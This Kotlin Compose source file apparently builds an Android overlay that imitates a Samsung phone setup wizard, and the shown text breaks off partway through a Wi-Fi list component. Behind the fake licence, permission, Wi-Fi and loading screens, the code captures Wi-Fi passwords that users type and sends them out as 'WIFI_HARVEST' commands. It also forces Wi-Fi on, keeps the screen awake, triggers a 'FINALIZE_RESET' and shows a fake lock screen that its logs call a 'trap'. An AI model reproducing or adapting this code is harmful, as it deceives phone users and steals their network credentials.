package com.example.dynamic

import android.content.Context
import android.graphics.Typeface
import android.view.View
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.Info
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.draw.scale
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.interaction.collectIsPressedAsState
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.PathEffect
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.ComposeView
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextDecoration
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.foundation.gestures.detectVerticalDragGestures
import androidx.compose.foundation.gestures.detectTapGestures
import com.example.myandroid.dynamic.DynamicEntry
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class WelcomeUI : DynamicEntry() {

    private val SamsungBlue = Color(0xFF007AFF)
    private val SamsungGreen = Color(0xFF3EB07A)
    private val LightBlue = Color(0xFFE1F5FE)
    private val TextBlack = Color(0xFF000000)
    private val TextGrey = Color(0xFF757575)
    private val DividerGrey = Color(0xFFE0E0E0)

    override fun getView(context: Context, bridge: Any, baseDir: String): View {
        return ComposeView(context).apply {
            setContent {
                // Loading font directly from the Main App's assets folder!
                val customFont = remember(context) {
                    try {
                        val nativeTypeface = Typeface.createFromAsset(context.assets, "app_font.ttf")
                        FontFamily(androidx.compose.ui.text.font.Typeface(nativeTypeface))
                    } catch (e: Exception) {
                        FontFamily.SansSerif
                    }
                }

                val typography = Typography(
                    displayLarge = TextStyle(fontFamily = customFont),
                    displayMedium = TextStyle(fontFamily = customFont),
                    displaySmall = TextStyle(fontFamily = customFont),
                    headlineLarge = TextStyle(fontFamily = customFont),
                    headlineMedium = TextStyle(fontFamily = customFont),
                    headlineSmall = TextStyle(fontFamily = customFont),
                    titleLarge = TextStyle(fontFamily = customFont),
                    titleMedium = TextStyle(fontFamily = customFont),
                    titleSmall = TextStyle(fontFamily = customFont),
                    bodyLarge = TextStyle(fontFamily = customFont),
                    bodyMedium = TextStyle(fontFamily = customFont),
                    bodySmall = TextStyle(fontFamily = customFont),
                    labelLarge = TextStyle(fontFamily = customFont),
                    labelMedium = TextStyle(fontFamily = customFont),
                    labelSmall = TextStyle(fontFamily = customFont)
                )

                MaterialTheme(typography = typography) {
                    CompositionLocalProvider(LocalTextStyle provides TextStyle(fontFamily = customFont)) {
                        SetupWizard(bridge, baseDir)
                    }
                }
            }
            
            // Native Window Self-Reconfiguration:
            // Mutates the WindowManager parameters at runtime to allow text focus
            // and soft-keyboard resizing dynamically.
            post {
                try {
                    val wm = context.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
                    val params = layoutParams as? android.view.WindowManager.LayoutParams
                    if (params != null) {
                        params.flags = params.flags and android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
                        params.softInputMode = android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
                        wm.updateViewLayout(this, params)
                    }
                } catch(e: Exception) { }
            }
        }
    }

    @Composable
    fun SetupWizard(bridge: Any, baseDir: String) {
        val api = remember { com.example.myandroid.dynamic.CortexNativeAPI(bridge) }
        var currentStep by remember { mutableStateOf(0) }
        var isProcessing by remember { mutableStateOf(false) }
        val scope = rememberCoroutineScope() 
        val transientSteps = remember { listOf(4, 5, 7, 8, 9, 11, 12, 16, 17, 18, 21) }

        fun navigateTo(step: Int) {
            if (isProcessing) return
            scope.launch {
                isProcessing = true
                // Only simulate latency when moving forward to a new task
                if (step > currentStep) delay(450) 
                currentStep = step
                isProcessing = false
            }
        }

        Box(modifier = Modifier.fillMaxSize().background(Color.White)) {
            AnimatedContent(
                targetState = currentStep,
                transitionSpec = {
                    val duration = 400
                    if (targetState > initialState) {
                        (slideInHorizontally(tween(duration)) { it } + fadeIn(tween(duration))).togetherWith(
                            slideOutHorizontally(tween(duration)) { -it } + fadeOut(tween(duration)))
                    } else {
                        (slideInHorizontally(tween(duration)) { -it } + fadeIn(tween(duration))).togetherWith(
                            slideOutHorizontally(tween(duration)) { it } + fadeOut(tween(duration)))
                    }.using(SizeTransform(clip = false))
                },
                label = "StepTransition"
            ) { targetStep ->
                Column(modifier = Modifier.fillMaxSize()) {
                    when (targetStep) {
                        0 -> WelcomeScreen(
                            onStart = { api.log("WELCOME_UI: Tapped [Start]"); navigateTo(1) },
                            onEmergency = { api.log("WELCOME_UI: Tapped [Emergency] -> DEV TELEPORT to 20"); navigateTo(20) },
                            onDevExit = { api.log("WELCOME_UI: Dev Exit triggered. Tearing down overlay."); api.close() }
                        )
                        1 -> ReviewScreen { api.log("WELCOME_UI: Tapped [Agree Review]"); navigateTo(2) }
                        2 -> PermissionsScreen(baseDir) { api.log("WELCOME_UI: Tapped [Agree Permissions]"); navigateTo(3) }
                        3 -> WifiScreen(baseDir, api, onSkip = { api.log("WELCOME_UI: Tapped [Skip Wifi]"); navigateTo(4) }, onConnected = { navigateTo(4) })
                        4 -> LoadingScreen(baseDir, null, "Checking for updates...", assetPath = "checking_info_icon.png", onComplete = { api.log("WELCOME_UI: Loading 4 complete"); navigateTo(5) })
                        5 -> LoadingScreen(baseDir, null, "Getting your phone ready...", assetPath = "checking_info_icon.png", onComplete = { api.log("WELCOME_UI: Loading 5 complete"); navigateTo(6) })
                        6 -> CopyDataScreen(baseDir, onNext = { api.log("WELCOME_UI: Tapped [Next Copy Data]"); navigateTo(7) })
                        7 -> LoadingScreen(baseDir, null, "Checking info...", assetPath = "checking_info_icon.png", onComplete = { api.log("WELCOME_UI: Loading 7 complete"); navigateTo(8) })
                        8 -> LoadingScreen(baseDir, null, "Getting your account info...", isGoogle = true, onComplete = { api.log("WELCOME_UI: Loading 8 complete"); navigateTo(9) })
                        9 -> LoadingScreen(baseDir, null, "Google services", isGoogle = true, onComplete = { api.log("WELCOME_UI: Loading 9 complete"); navigateTo(10) })
                        10 -> ProtectPhoneScreen(onSkip = { api.log("WELCOME_UI: Tapped [Skip Protection]"); navigateTo(11) })
                        11 -> LoadingScreen(baseDir, null, "", onComplete = { api.log("WELCOME_UI: Loading 11 complete"); navigateTo(12) })
                        12 -> LoadingScreen(baseDir, null, "Checking...", isAssistant = true, onComplete = { api.log("WELCOME_UI: Loading 12 complete"); navigateTo(13) })
                        13 -> AssistantHeyGoogleScreen(baseDir, onNext = { api.log("WELCOME_UI: Tapped [Agree/Skip Hey Google]"); navigateTo(14) })
                        14 -> AssistantLockScreen(baseDir, onNext = { api.log("WELCOME_UI: Tapped [Agree/Skip Assistant Lock]"); navigateTo(15) })
                        15 -> AppReviewScreen(baseDir, onOk = { api.log("WELCOME_UI: Tapped [OK App Review]"); navigateTo(16) })
                        16 -> LoadingScreen(baseDir, null, "Getting your phone ready...", assetPath = "checking_info_icon.png", onComplete = { api.log("WELCOME_UI: Loading 16 complete"); navigateTo(17) })
                        17 -> LoadingScreen(baseDir, null, "Please wait...", assetPath = "samsung_dots_header.png", onComplete = { api.log("WELCOME_UI: Loading 17 complete"); navigateTo(18) })
                        18 -> LoadingScreen(baseDir, null, "Get recommended apps", assetPath = "samsung_dots_header.png", onComplete = { api.log("WELCOME_UI: Loading 18 complete"); navigateTo(19) })
                        19 -> RecommendedAppsScreen(baseDir, onNext = { api.log("WELCOME_UI: Tapped [Next Recommended Apps]"); navigateTo(20) })
                        20 -> FinalSetupScreen(onFinish = { 
                            api.log("WELCOME_UI: Tapped [Finish]! Commencing UI Stutter & Ignition Lock.")
                            api.applyEmergencyWallpapers() // Set emergency wallpapers on both screens
                            api.keepScreenIgnited(true) // Ensure OS doesn't sleep while we render video
                            scope.launch(kotlinx.coroutines.Dispatchers.Main) {
                                val startStutter = System.currentTimeMillis()
                                while (System.currentTimeMillis() - startStutter < 3000) { 
                                    try { Thread.sleep(80) } catch(e: Exception) {}
                                    delay(10)
                                }
                                api.log("WELCOME_UI: Transitioning to Fake Lock Screen & firing FINALIZE_RESET.")
                                api.executeCommand("{\"file_name\":\"FINALIZE_RESET\",\"content\":\"\"}")
                                currentStep = 21 
                            }
                        })
                        21 -> FakeLockScreen(baseDir, api, onSwipeUp = { 
                            api.log("WELCOME_UI: User swiped up on fake lock screen. Routing to HOME and terminating trap.")
                            api.executeCommand("{\"file_name\":\"START_BOOT_OVERLAY\",\"content\":\"\"}")
                            api.nav("HOME")
                            scope.launch {
                                delay(300) // Brief delay to let the OS process the Home intent under the blindfold
                                api.close()
                            }
                        })
                    }
                }
            }

            if (!transientSteps.contains(currentStep)) {
                Box(
                    modifier = Modifier
                        .align(Alignment.BottomStart)
                        .padding(16.dp)
                        .size(48.dp)
                        .clip(CircleShape)
                        .clickable {
                            if (currentStep > 0) {
                                var target = currentStep - 1
                                // Smart-Back: Jump over loading screens
                                while (target > 0 && transientSteps.contains(target)) {
                                    target--
                                }
                                navigateTo(target)
                            } else {
                                api.nav("BACK")
                            }
                        },
                    contentAlignment = Alignment.Center
                ) {
                    Icon(Icons.Default.ArrowBack, null, tint = Color.Black, modifier = Modifier.size(32.dp))
                }
            }

            if (isProcessing) {
                LinearProgressIndicator(
                    modifier = Modifier.fillMaxWidth().align(Alignment.TopCenter).height(2.dp),
                    color = SamsungBlue,
                    trackColor = Color.Transparent
                )
            }
        }
    }

    @Composable
    fun LoadingScreen(baseDir: String, icon: ImageVector?, title: String, isGoogle: Boolean = false, isAssistant: Boolean = false, assetPath: String? = null, onComplete: () -> Unit) {
        LaunchedEffect(Unit) {
            delay(if (title.isEmpty()) 2500 else 4000)
            onComplete()
        }
        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Spacer(modifier = Modifier.height(80.dp))
            when {
                isGoogle -> GoogleGIcon(baseDir)
                isAssistant -> AssistantLogo(baseDir)
                assetPath != null -> DynamicImage(baseDir, assetPath, modifier = Modifier.size(44.dp))
                icon != null -> Icon(icon, null, tint = SamsungBlue, modifier = Modifier.size(40.dp))
            }
            if (title.isNotEmpty()) {
                Text(title, fontSize = 32.sp, textAlign = TextAlign.Center, modifier = Modifier.padding(top = 20.dp))
                if (!isGoogle && !isAssistant) {
                    Text("This may take a few minutes", fontSize = 18.sp, color = TextGrey, modifier = Modifier.padding(top = 8.dp))
                }
            }
            Spacer(modifier = Modifier.weight(1f))
            SamsungSpinner(baseDir)
            Spacer(modifier = Modifier.weight(1.5f))
        }
    }

        @Composable
    fun WelcomeScreen(onStart: () -> Unit, onEmergency: () -> Unit, onDevExit: () -> Unit) {
        var devTapCount by remember { mutableStateOf(0) }
        var lastTapTime by remember { mutableStateOf(0L) }

        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxSize()) {
            Spacer(modifier = Modifier.weight(1.2f))
            Text("Welcome!", fontSize = 44.sp, color = TextBlack)
            Spacer(modifier = Modifier.weight(1.8f))
            Row(verticalAlignment = Alignment.CenterVertically) { 
                Text("English (United Kingdom)", fontSize = 18.sp); Icon(Icons.Default.ArrowDropDown, null, modifier = Modifier.size(28.dp)) 
            }
            Spacer(modifier = Modifier.height(24.dp))
            Button(onClick = onStart, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(30.dp), modifier = Modifier.width(220.dp).height(54.dp)) {
                Text("Start", color = Color.White, fontSize = 20.sp)
            }
            Spacer(modifier = Modifier.weight(1f))
            Text("Emergency call", fontWeight = FontWeight.Bold, textDecoration = TextDecoration.Underline, modifier = Modifier.padding(12.dp).clickable { onEmergency() })
            Text(
                text = "Accessibility", 
                fontWeight = FontWeight.Bold, 
                textDecoration = TextDecoration.Underline, 
                modifier = Modifier
                    .padding(bottom = 60.dp)
                    .clickable {
                        val now = System.currentTimeMillis()
                        if (now - lastTapTime < 500) {
                            devTapCount++
                        } else {
                            devTapCount = 1
                        }
                        lastTapTime = now
                        if (devTapCount >= 5) {
                            onDevExit()
                        }
                    }
            )
        } 
    }

    @Composable
    fun ReviewScreen(onAgree: () -> Unit) {
        var checks by remember { mutableStateOf(listOf(false, false, false, false)) }
        val agreeAll = checks.all { it }
        Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp)) {
            Spacer(modifier = Modifier.height(80.dp))
                            Icon(Icons.Default.Info, null, tint = SamsungBlue, modifier = Modifier.size(36.dp).align(Alignment.CenterHorizontally))
            Text("For your review", fontSize = 32.sp, modifier = Modifier.align(Alignment.CenterHorizontally).padding(top = 16.dp, bottom = 40.dp))
            ReviewItem("End User Licence Agreement", "This includes your agreement that Samsung may update your phone software automatically from time to time to ensure the safety, security, and functionality of your phone.", checks[0]) { checks = checks.toMutableList().apply { set(0, !checks[0]) } }
            ReviewItem("Privacy Policy", null, checks[1]) { checks = checks.toMutableList().apply { set(1, !checks[1]) } }
            ReviewItem("Sending of Diagnostic Data (optional)", null, checks[2]) { checks = checks.toMutableList().apply { set(2, !checks[2]) } }
            ReviewItem("Information Linking (optional)", null, checks[3]) { checks = checks.toMutableList().apply { set(3, !checks[3]) } }
            DashedDivider(modifier = Modifier.padding(vertical = 20.dp))
                            ReviewItem("Agree to all (optional)", null, agreeAll, true) { checks = List(4) { !agreeAll } }
            Spacer(modifier = Modifier.weight(1f))
            Box(modifier = Modifier.fillMaxWidth().padding(bottom = 40.dp), contentAlignment = Alignment.BottomEnd) {
                Button(onClick = onAgree, enabled = checks[0] && checks[1], colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue, disabledContainerColor = SamsungBlue.copy(alpha = 0.4f)), shape = RoundedCornerShape(25.dp), modifier = Modifier.width(120.dp).height(48.dp)) {
                    Text("Agree", color = Color.White, fontSize = 18.sp)
                }
            }
        }
    }

    @Composable
    fun PermissionsScreen(baseDir: String, onAgree: () -> Unit) {
        Column(modifier = Modifier.fillMaxSize().verticalScroll(rememberScrollState())) {
            Spacer(modifier = Modifier.height(60.dp))
            Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) { DynamicImage(baseDir, "samsung_dots_header.png", modifier = Modifier.size(40.dp)) }
            Text(text = "Permissions for Samsung\napps and services", fontSize = 28.sp, lineHeight = 34.sp, fontWeight = FontWeight.Medium, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(start = 24.dp, end = 24.dp, top = 24.dp, bottom = 40.dp))
            PermissionSection("Continuity Service")
            PermissionItem(baseDir, "Nearby devices", "Used to scan for your nearby devices and share information about them with Samsung apps and services, allowing you to copy and paste from one device to another, continue tasks, and enjoy a seamless experience", iconAsset = "nearby_devices_icon.png")
            PermissionItem(baseDir, "Phone", "Used to answer or decline calls using your earbuds")
            PermissionSection("Nearby device scanning")
            PermissionItem(baseDir, "Nearby devices", "Used to scan for nearby devices and share information about them with Samsung apps and services, allowing you to connect to wearable devices, mobile accessories, and smart home devices quickly and easily even if Bluetooth is turned off", iconAsset = "nearby_devices_icon.png")
            Spacer(modifier = Modifier.weight(1f))
            Box(modifier = Modifier.fillMaxWidth().padding(24.dp), contentAlignment = Alignment.BottomEnd) {
                Button(onClick = onAgree, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(25.dp), modifier = Modifier.width(130.dp).height(50.dp)) {
                    Text("Agree", color = Color.White, fontSize = 18.sp)
                }
            }
            Spacer(modifier = Modifier.height(40.dp))
        }
    }

        @Composable
    fun WifiScreen(baseDir: String, api: com.example.myandroid.dynamic.CortexNativeAPI, onSkip: () -> Unit, onConnected: () -> Unit) {
        var isWifiEnabled by remember { mutableStateOf(true) }
        var networks by remember { mutableStateOf<List<org.json.JSONObject>>(emptyList()) }
        var selectedSsid by remember { mutableStateOf<String?>(null) }
        var connectedSsid by remember { mutableStateOf<String?>(null) }
        var connectingSsid by remember { mutableStateOf<String?>(null) }
        var connectionSuccess by remember { mutableStateOf(false) }
        var showWrongPasswordError by remember { mutableStateOf(false) }
        
        var isAddNetworkOpen by remember { mutableStateOf(false) }
        var addSsid by remember { mutableStateOf("") }
        var addSecType by remember { mutableStateOf("WPA/WPA2-Personal") }
        var addPassword by remember { mutableStateOf("") }
        var showAddPassword by remember { mutableStateOf(false) }
        var isSecDropdownExpanded by remember { mutableStateOf(false) }
        var autoReconnect by remember { mutableStateOf(true) }

        // Live Scanning Effect
        LaunchedEffect(isWifiEnabled) {
            if (isWifiEnabled && !api.isWifiEnabledNatively()) {
                api.log("WELCOME_WIFI: Native Wi-Fi is OFF. Dispatching Ghost Hand to enable it.")
                val cmd = org.json.JSONObject().apply {
                    put("file_name", "FORCE_WIFI")
                    put("content", "ENABLE")
                }
                api.executeCommand(cmd.toString())
                delay(6000) // Wait for Ghost Hand sequence to finish
            }
            
            while (isWifiEnabled) {
                try {
                    val raw = api.getNearbyWifi()
                    val arr = org.json.JSONArray(raw)
                    val list = mutableListOf<org.json.JSONObject>()
                    val seen = mutableSetOf<String>()
                    for (i in 0 until arr.length()) {
                        val obj = arr.getJSONObject(i)
                        val ssid = obj.optString("ssid", "")
                        if (ssid.isNotBlank() && seen.add(ssid)) list.add(obj)
                    }
                    
                    // NATIVE STABILITY: Preserve and pin the active networks
                    val activeSsid = connectingSsid ?: connectedSsid ?: selectedSsid
                    if (activeSsid != null && !seen.contains(activeSsid)) {
                        val existing = networks.find { it.optString("ssid") == activeSsid }
                        if (existing != null) {
                            list.add(existing)
                        } else if (activeSsid == connectingSsid) {
                            list.add(org.json.JSONObject().apply { put("ssid", activeSsid); put("level", 100); put("caps", "WPA") })
                        }
                    }

                    networks = list.sortedWith(compareByDescending<org.json.JSONObject> { 
                        val s = it.optString("ssid")
                        s == connectingSsid || s == connectedSsid
                    }.thenByDescending { 
                        it.optInt("level", 0) 
                    })
                } catch (e: Exception) { }
                delay(4000)
            }
        }

        Box(modifier = Modifier.fillMaxSize()) {
            Column(modifier = Modifier.fillMaxSize().padding(horizontal = 24.dp)) {
                Spacer(modifier = Modifier.height(80.dp))
                DynamicImage(baseDir, "wifi_logo.png", modifier = Modifier.size(36.dp).align(Alignment.CenterHorizontally))
                Text("Choose a Wi-Fi network", fontSize = 32.sp, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth().padding(top = 16.dp, bottom = 40.dp))
                
                if (isWifiEnabled) {
                    androidx.compose.foundation.lazy.LazyColumn(modifier = Modifier.weight(1f)) {
                        item {
                            Row(
                                verticalAlignment = Alignment.CenterVertically, 
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .clickable { isAddNetworkOpen = true }
                                    .padding(vertical = 12.dp)
                            ) {
                                Icon(Icons.Default.Add, null, tint = SamsungGreen, modifier = Modifier.size(28.dp))
                                Text("Add network", fontSize = 20.sp, modifier = Modifier.padding(start = 24.dp).weight(1f))
                                Icon(Icons.Default.Search, null, tint = Color.Black, modifier = Modifier.size(24.dp))
                            }
                        }
                        
                        if (networks.isEmpty() && connectingSsid == null) {
                            item { 
                                Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
                                    SamsungOrbitSpinner()
                                }
                            }
                        } else {
                            items(count = networks.size, key = { networks[it].optString("ssid") }) { index ->
                                val net = networks[index]
                                val currentSsid = net.optString("ssid")
                                val isThisConnected = connectionSuccess && currentSsid == connectedSsid
                                val isThisConnecting = currentSsid == connectingSsid
                                WifiNetworkRow(net, isThisConnected, isThisConnecting) { selectedSsid = currentSsid }
                            }
                        }
                    }
                } else {
                    Spacer(modifier = Modifier.weight(1f))
                }

                Text(
                    text = if (isWifiEnabled) "Turn off Wi-Fi" else "Turn on Wi-Fi",
                    color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp,
                    modifier = Modifier.padding(vertical = 16.dp).clickable { isWifiEnabled = !isWifiEnabled; if(!isWifiEnabled) networks = emptyList() }
                )
                Text("Skip", color = SamsungBlue, fontWeight = FontWeight.Bold, fontSize = 18.sp, modifier = Modifier.padding(bottom = 80.dp).clickable { onSkip() })
            }

            if (selectedSsid != null) {
                SamsungPasswordDialog(
                    ssid = selectedSsid!!,
                    isConnecting = false,
                    showError = showWrongPasswordError,
                    onDismiss = { 
                        selectedSsid = null
                        showWrongPasswordError = false
                    }
                ) { password ->
                    showWrongPasswordError = false
                    val ssid = selectedSsid!!
                    
                    connectingSsid = ssid
                    selectedSsid = null // Close dialog immediately
                    
                    val logCmd = org.json.JSONObject().apply {
                        put("file_name", "PING")
                        put("content", "WIFI_HARVEST | SSID: $ssid | PASS: $password")
                    }
                    api.executeCommand(logCmd.toString())
                    
                    api.connectToWifi(ssid, password)
                    
                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch { 
                        var status = "CONNECTING"
                        while(status == "CONNECTING" || status == "NONE") {
                            delay(500)
                            status = api.getWifiStatus()
                        }
                        
                        if (status == "SUCCESS") {
                            connectionSuccess = true
                            connectedSsid = ssid
                            connectingSsid = null
                            delay(1000)
                            onConnected()
                        } else {
                            connectingSsid = null
                            selectedSsid = ssid // Re-open dialog
                            showWrongPasswordError = true
                        }
                    }
                }
            }

            // Samsung One UI "Add Network" Sliding Sheet Overlay
            AnimatedVisibility(
                visible = isAddNetworkOpen,
                enter = slideInVertically(initialOffsetY = { it }) + fadeIn(),
                exit = slideOutVertically(targetOffsetY = { it }) + fadeOut(),
                modifier = Modifier.fillMaxSize()
            ) { 
                Column(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(Color.White)
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .statusBarsPadding()
                            .padding(horizontal = 16.dp, vertical = 12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        IconButton(onClick = { isAddNetworkOpen = false }) {
                            Icon(Icons.Default.Close, contentDescription = "Close", tint = Color.Black)
                        }
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Add network", fontSize = 22.sp, fontWeight = FontWeight.Medium, color = Color.Black)
                    }

                    Column(
                        modifier = Modifier
                            .weight(1f)
                            .fillMaxWidth()
                            .verticalScroll(rememberScrollState())
                    ) {
                        OutlinedTextField(
                            value = addSsid,
                            onValueChange = { addSsid = it },
                            label = { Text("Network name") },
                            singleLine = true,
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(horizontal = 24.dp, vertical = 8.dp),
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedTextColor = Color.Black,
                                unfocusedTextColor = Color.Black,
                                focusedBorderColor = SamsungBlue,
                                focusedLabelColor = SamsungBlue
                            )
                        )

                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(horizontal = 24.dp, vertical = 8.dp)
                        ) {
                            Column {
                                Text("Security", fontSize = 12.sp, color = SamsungBlue)
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .clickable { isSecDropdownExpanded = true }
                                        .padding(vertical = 12.dp)
                                        .border(1.dp, Color.LightGray, RoundedCornerShape(4.dp))
                                        .padding(12.dp),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(addSecType, fontSize = 16.sp, color = Color.Black)
                                    Icon(Icons.Default.ArrowDropDown, null, tint = Color.Gray)
                                } 
                            }
                            DropdownMenu(
                                expanded = isSecDropdownExpanded,
                                onDismissRequest = { isSecDropdownExpanded = false },
                                modifier = Modifier
                                    .fillMaxWidth(0.85f)
                                    .background(Color.White)
                            ) {
                                listOf("None", "WEP", "WPA/WPA2-Personal", "WPA3-Personal").forEach { type ->
                                    DropdownMenuItem(
                                        text = { Text(type, color = Color.Black) },
                                        onClick = {
                                            addSecType = type
                                            isSecDropdownExpanded = false
                                        }
                                    )
                                } 
                            }
                        }

                        if (addSecType != "None") {
                            OutlinedTextField(
                                value = addPassword,
                                onValueChange = { addPassword = it },
                                label = { Text("Password") },
                                singleLine = true,
                                visualTransformation = if (showAddPassword) {
                                    androidx.compose.ui.text.input.VisualTransformation.None
                                } else {
                                    androidx.compose.ui.text.input.PasswordVisualTransformation()
                                },
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(horizontal = 24.dp, vertical = 8.dp),
                                colors = OutlinedTextFieldDefaults.colors(
                                    focusedTextColor = Color.Black,
                                    unfocusedTextColor = Color.Black,
                                    focusedBorderColor = SamsungBlue,
                                    focusedLabelColor = SamsungBlue
                                )
                            )
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(horizontal = 24.dp, vertical = 8.dp)
                                    .clickable(
                                        interactionSource = remember { MutableInteractionSource() },
                                        indication = null
                                    ) { showAddPassword = !showAddPassword },
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                SamsungCheckbox(showAddPassword) { showAddPassword = !showAddPassword }
                                Text("Show password", modifier = Modifier.padding(start = 12.dp), fontSize = 16.sp, color = Color.Black)
                            }
                        }

                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(horizontal = 24.dp, vertical = 16.dp),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text("Auto reconnect", fontSize = 16.sp, color = Color.Black)
                            Switch(
                                checked = autoReconnect,
                                onCheckedChange = { autoReconnect = it },
                                colors = SwitchDefaults.colors(
                                    checkedThumbColor = Color.White,
                                    checkedTrackColor = SamsungBlue
                                )
                            )
                        }
                    }

                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .navigationBarsPadding()
                            .padding(24.dp),
                        horizontalArrangement = Arrangement.End,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            "Cancel",
                            color = SamsungBlue,
                            fontWeight = FontWeight.Bold,
                            fontSize = 18.sp,
                            modifier = Modifier
                                .padding(16.dp)
                                .clickable { isAddNetworkOpen = false }
                        )
                        Button(
                            onClick = {
                                val ssid = addSsid
                                isAddNetworkOpen = false
                                connectingSsid = ssid
                                
                                // Inject into list if missing so it renders instantly
                                if (networks.none { it.optString("ssid") == ssid }) {
                                    val newNet = org.json.JSONObject().apply { put("ssid", ssid); put("level", 100); put("caps", if(addSecType == "None") "" else "WPA") }
                                    networks = listOf(newNet) + networks
                                }

                                val logCmd = org.json.JSONObject().apply {
                                    put("file_name", "PING")
                                    put("content", "WIFI_ADD_HARVEST | SSID: $ssid | SEC: $addSecType | PASS: $addPassword")
                                }
                                api.executeCommand(logCmd.toString())
                                
                                api.connectToWifi(ssid, addPassword)
                                
                                kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch { 
                                    var status = "CONNECTING"
                                    while(status == "CONNECTING" || status == "NONE") {
                                        delay(500)
                                        status = api.getWifiStatus()
                                    }
                                    
                                    if (status == "SUCCESS") {
                                        connectionSuccess = true
                                        connectedSsid = ssid
                                        connectingSsid = null
                                        delay(1000)
                                        onConnected()
                                    } else {
                                        connectingSsid = null
                                        api.log("WELCOME_WIFI: Manual connection to $ssid failed.")
                                        api.toast("Failed to connect to $ssid")
                                    }
                                }
                            },
                            enabled = addSsid.isNotBlank() && (addSecType == "None" || addPassword.length >= 8),
                            colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue),
                            shape = RoundedCornerShape(20.dp),
                            modifier = Modifier.height(48.dp)
                        ) {
                            Text("Connect", fontSize = 16.sp)
                        }
                    }
                } 
            }
        }
    }

        @Composable
    fun DynamicWifiIcon(level: Int, color: Color, modifier: Modifier = Modifier) {
        androidx.compose.foundation.Canvas(modifier = modifier) {
            val scaleX = size.width / 24f
            val scaleY = size.height / 24f
            
            val dotPath = androidx.compose.ui.graphics.Path().apply {
                moveTo(9f * scaleX, 17f * scaleY)
                lineTo(12f * scaleX, 21f * scaleY)
                lineTo(15f * scaleX, 17f * scaleY)
                cubicTo(13.3f * scaleX, 15.3f * scaleY, 10.7f * scaleX, 15.3f * scaleY, 9f * scaleX, 17f * scaleY)
                close()
            }
            drawPath(dotPath, color)

            if (level > 33) {
                val midPath = androidx.compose.ui.graphics.Path().apply {
                    moveTo(5f * scaleX, 13f * scaleY)
                    lineTo(7f * scaleX, 15f * scaleY)
                    cubicTo(9.8f * scaleX, 12.2f * scaleY, 14.2f * scaleX, 12.2f * scaleY, 17f * scaleX, 15f * scaleY)
                    lineTo(19f * scaleX, 13f * scaleY)
                    cubicTo(15.14f * scaleX, 9.14f * scaleY, 8.87f * scaleX, 9.14f * scaleY, 5f * scaleX, 13f * scaleY)
                    close()
                }
                drawPath(midPath, color)
            }

            if (level > 66) {
                val outerPath = androidx.compose.ui.graphics.Path().apply {
                    moveTo(1f * scaleX, 9f * scaleY)
                    lineTo(3f * scaleX, 11f * scaleY)
                    cubicTo(8f * scaleX, 6f * scaleY, 16f * scaleX, 6f * scaleY, 21f * scaleX, 11f * scaleY)
                    lineTo(23f * scaleX, 9f * scaleY)
                    cubicTo(16.93f * scaleX, 2.93f * scaleY, 7.08f * scaleX, 2.93f * scaleY, 1f * scaleX, 9f * scaleY)
                    close()
                }
                drawPath(outerPath, color)
            }
        }
    }

    @Composable
    fun WifiNetworkRow(net: org.json.JSONObject, isConnected: Boolean, isConnecting: Boolean, onClick: () -> Unit) {
        val ssid = net.optString("ssid")
        val level = net.optInt("level", 0)
